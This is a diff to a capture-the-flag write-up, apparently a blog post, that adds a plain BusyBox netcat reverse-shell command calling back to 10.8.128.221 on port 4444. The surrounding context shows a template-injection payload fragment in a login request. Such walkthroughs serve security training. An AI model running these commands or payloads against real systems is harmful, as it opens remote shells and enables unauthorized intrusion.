@@ -255,7 +255,11 @@ name=test&password=hacker&settings[view options][outputFunctionName]=x;process.m
 >I encoded the BusyBox reverse shell command using Base64, like this:
 {: .prompt-tip}
 
->`busybox nc 10.8.128.221 4444 -e bash |base64 You can also use the command without encoding, as shown below` 
+>`busybox nc 10.8.128.221 4444 -e bash | base64 You can also use the command without encoding, as shown below` 
+
+```console
+busybox nc 10.8.128.221 4444 -e bash
+```
 
 ### User Flag
 So guys, we successfully got a shell!
